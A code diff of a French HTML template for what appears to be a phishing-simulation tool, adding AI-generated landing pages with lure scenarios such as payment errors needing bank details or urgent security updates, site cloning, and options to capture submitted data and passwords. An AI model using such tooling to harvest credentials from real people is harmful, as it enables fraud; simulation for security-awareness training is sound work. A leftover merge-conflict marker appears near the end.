@@ -22,7 +22,10 @@
 <div class="table-responsive">
     <table class="table table-hover table-striped">
         <thead class="table-dark">
-            <tr><th>Nom</th><th class="text-end"></th></tr>
+            <tr>
+                <th>Nom</th>
+                <th class="text-end"></th>
+            </tr>
         </thead>
         <tbody id="landingPageTableBody">
             {% for page in landing_pages %}
@@ -47,49 +50,89 @@
                 <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
             </div>
             <div class="modal-body">
-                <!-- Nom de la landing page -->
+                <!-- Champ Nom -->
                 <label for="newLandingPageName" class="form-label"><strong>Nom :</strong></label>
-                <input type="text" id="newLandingPageName" placeholder="Saisissez un nom pour cette page..." class="form-control mb-2" required>
+                <input type="text" id="newLandingPageName" class="form-control mb-3" placeholder="Saisissez un nom pour cette page..." required>
 
-                <!-- Section Importer un site -->
-                <div class="border p-2 mb-3">
-                    <h6 class="mb-2">Importer un site</h6>
-                    <label for="importSiteURL" class="form-label"><strong>URL du site :</strong></label>
-                    <input type="text" id="importSiteURL" class="form-control" placeholder="http://example.com">
-                    <div class="form-check mt-2">
-                        <input class="form-check-input" type="checkbox" id="includeResources">
-                        <label class="form-check-label" for="includeResources">
-                            Inclure les ressources (ajouter un tag &lt;base&gt;)
-                        </label>
+                <!-- Choix de la méthode -->
+                <label class="form-label"><strong>Méthode de création :</strong></label>
+                <div class="mb-3">
+                    <div class="form-check form-check-inline">
+                        <input class="form-check-input" type="radio" name="creationMethod" id="manualMethod" value="manual" checked>
+                        <label class="form-check-label" for="manualMethod">Manuel / Import</label>
                     </div>
-                    <button class="btn btn-info btn-sm mt-2" type="button" onclick="importSite()">Importer</button>
+                    <div class="form-check form-check-inline">
+                        <input class="form-check-input" type="radio" name="creationMethod" id="aiMethod" value="ai">
+                        <label class="form-check-label" for="aiMethod">Génération IA</label>
+                    </div>
                 </div>
 
-                <!-- Code HTML de la landing page -->
-                <div class="d-flex justify-content-between align-items-center mb-1">
-                    <label for="newLandingPageHTML" class="form-label"><strong>Aperçu / Code source</strong></label>
-                    <!-- Le bouton bascule l'affichage entre le textarea et l'iframe de preview -->
-                    <div class="form-check form-switch">
-                        <label class="form-check-label" for="toggleViewSwitch">
+                <!-- Section manuelle/import -->
+                <div id="manualFields">
+                    <div class="border p-2 mb-3">
+                        <h6 class="mb-2">Importer un site</h6>
+                        <label for="importSiteURL" class="form-label"><strong>URL du site :</strong></label>
+                        <input type="text" id="importSiteURL" class="form-control" placeholder="http://example.com">
+                        <div class="form-check mt-2">
+                            <input class="form-check-input" type="checkbox" id="includeResources">
+                            <label class="form-check-label" for="includeResources">Inclure les ressources (&lt;base&gt;)</label>
+                        </div>
+                        <button class="btn btn-info btn-sm mt-2" type="button" onclick="importSite()">Importer</button>
+                    </div>
+
+                    <div class="d-flex justify-content-between align-items-center mb-1">
+                        <label for="newLandingPageHTML" class="form-label"><strong>Aperçu / Code source</strong></label>
+                        <div class="form-check form-switch">
                             <input class="form-check-input" type="checkbox" id="toggleViewSwitch" onchange="togglePreview('newLandingPageHTML', 'previewNewPageFrame')">
-                            <span id="toggleLabel">Code</span> / <span>Vue</span>
-                        </label>
+                            <label class="form-check-label" for="toggleViewSwitch">
+                                <span id="toggleLabel">Code</span> / <span>Vue</span>
+                            </label>
+                        </div>
                     </div>
+                    <textarea id="newLandingPageHTML" class="form-control" rows="5" placeholder="Collez ici le HTML de la page..."></textarea>
+                    <iframe id="previewNewPageFrame" style="display:none; width:100%; height:300px; border:1px solid #ccc;"></iframe>
                 </div>
-                <textarea id="newLandingPageHTML" placeholder="Tapez ici le contenu du message à envoyer..." class="form-control" rows="5" required></textarea>
-                <!-- Utilisation d'un iframe pour isoler le rendu -->
-                <iframe id="previewNewPageFrame" style="display:none; width:100%; height:300px; border:1px solid #ccc;"></iframe>
 
-                <!-- Options supplémentaires -->
-                <label class="form-label mt-2"><strong>Capture des données :</strong></label>
+                <!-- Section IA -->
+                <div id="aiFields" style="display:none;">
+                    <label for="landingScenario" class="form-label"><strong>Scénario :</strong></label>
+                    <select id="landingScenario" class="form-select mb-3">
+                        <option value="">-- Choisir un scénario --</option>
+                        <option value="Départ à la retraite">Départ à la retraite</option>
+                        <option value="Erreur de paiement - RIB nécessaire">Erreur de paiement</option>
+                        <option value="Invitation à un événement exclusif">Invitation à un événement exclusif</option>
+                        <option value="Mise à jour de sécurité urgente">Mise à jour de sécurité urgente</option>
+                        <option value="Organisation de covoiturage">Organisation de covoiturage</option>
+                        <option value="Chèques de voyage">Chèques de voyage</option>
+                        <option value="Salon à l'étranger">Salon à l'étranger</option>
+                        <option value="Urgence médicale">Urgence médicale</option>
+                        <option value="Support émotionnel">Support émotionnel</option>
+                    </select>
+
+                    <button class="btn btn-primary btn-sm mb-3" onclick="generateAILanding()">🌟 Générer par IA</button>
+
+                    <!-- Toggle pour IA : Code / Vue -->
+                    <div class="d-flex justify-content-between align-items-center mb-1">
+                        <label for="toggleViewSwitchIA" class="form-label"><strong>Aperçu / Code source</strong></label>
+                        <div class="form-check form-switch">
+                            <input class="form-check-input" type="checkbox" id="toggleViewSwitchIA" onchange="togglePreviewIA('aiGeneratedLandingHTML', 'previewAIALandingFrame')">
+                            <label class="form-check-label" for="toggleViewSwitchIA">
+                                <span id="toggleLabelIA">Code</span> / <span>Vue</span>
+                            </label>
+                        </div>
+                    </div>
+                    <textarea id="aiGeneratedLandingHTML" class="form-control" rows="6" placeholder="Le code généré par IA apparaîtra ici..."></textarea>
+                    <iframe id="previewAIALandingFrame" style="display:none; width:100%; height:300px; border:1px solid #ccc;"></iframe>
+                </div>
+
+                <!-- Options communes -->
+                <label for="newCaptureCredentials" class="form-label mt-2"><strong>Capture des données :</strong></label>
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="newCaptureCredentials">
                     <label class="form-check-label" for="newCaptureCredentials">
                         Activer la capture des données
                     </label>
                 </div>
-
-                <label class="form-label mt-2"><strong>Capture des mots de passe :</strong></label>
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="newCapturePasswords" disabled>
                     <label class="form-check-label" for="newCapturePasswords">
@@ -107,8 +150,7 @@
     </div>
 </div>
 
-<!-- Le modal de modification reste inchangé -->
-<!-- ========== MODAL: MODIFIER UNE LANDING PAGE ========== -->
+<!-- ========== MODAL: ÉDITER UNE LANDING PAGE ========== -->
 <div class="modal fade" id="editLandingPageModal" tabindex="-1">
     <div class="modal-dialog">
         <div class="modal-content">
@@ -119,33 +161,16 @@
             <div class="modal-body">
                 <input type="hidden" id="editLandingPageId">
                 <label for="editLandingPageName" class="form-label"><strong>Nom :</strong></label>
-                <input type="text" id="editLandingPageName" placeholder="Saisissez un nom pour cette page..." class="form-control mb-2" required>
-                <div class="d-flex justify-content-between align-items-center mb-1">
-                    <label for="editLandingPageHTML" class="form-label"><strong>Aperçu / Code source</strong></label>
-                    <div class="form-check form-switch">
-                        <label class="form-check-label" for="toggleViewSwitch">
-                            <input class="form-check-input" type="checkbox" id="toggleViewSwitch" onchange="togglePreview('editLandingPageHTML', 'previewEditPageFrame')">
-                            <span id="toggleLabel">Code</span> / <span>Vue</span>
-                        </label>
-                    </div>
+                <input type="text" id="editLandingPageName" class="form-control mb-3" placeholder="Nom de la page...">
+                <label for="editLandingPageHTML" class="form-label"><strong>HTML :</strong></label>
+                <textarea id="editLandingPageHTML" class="form-control" rows="5" placeholder="Modifiez le code HTML ici..."></textarea>
+                <div class="form-check mt-2">
+                    <input class="form-check-input" type="checkbox" id="editCaptureCredentials">
+                    <label class="form-check-label" for="editCaptureCredentials">Activer la capture des données</label>
                 </div>
-                <textarea id="editLandingPageHTML" placeholder="Tapez ici le contenu du message à envoyer..." class="form-control" rows="5" required></textarea>
-                <iframe id="previewEditPageFrame" style="display:none; width:100%; height:300px; border:1px solid #ccc;"></iframe>
-                
-                <!-- Options supplémentaires -->
-                <label class="form-label mt-2"><strong>Capture des données :</strong></label>
-                <div class="form-check">
-                    <input class="form-check-input" type="checkbox" id="editCaptureCredentials" checked>
-                    <label class="form-check-label" for="editCaptureCredentials">
-                        Activer la capture des données
-                    </label>
-                </div>
-                <label class="form-label mt-2"><strong>Capture des mots de passe :</strong></label>
-                <div class="form-check">
+                <div class="form-check mt-2">
                     <input class="form-check-input" type="checkbox" id="editCapturePasswords">
-                    <label class="form-check-label" for="editCapturePasswords">
-                        Capturer également les mots de passe
-                    </label>
+                    <label class="form-check-label" for="editCapturePasswords">Capturer les mots de passe</label>
                 </div>
                 <label for="editRedirectUrl" class="form-label mt-2"><strong>URL de redirection :</strong></label>
                 <input type="text" id="editRedirectUrl" class="form-control" placeholder="http://example.com">
@@ -157,7 +182,10 @@
     </div>
 </div>
 
-    
+<!-- Intégration du fichier JavaScript des fonctionnalités -->
 <script src="{{ url_for('static', filename='js/config-landing-pages.js') }}" defer></script>
+<<<<<<< HEAD
 
+=======
+>>>>>>> e457511e826cd0e718cdf71d853cda4bc5777c5c
 {% endblock %}
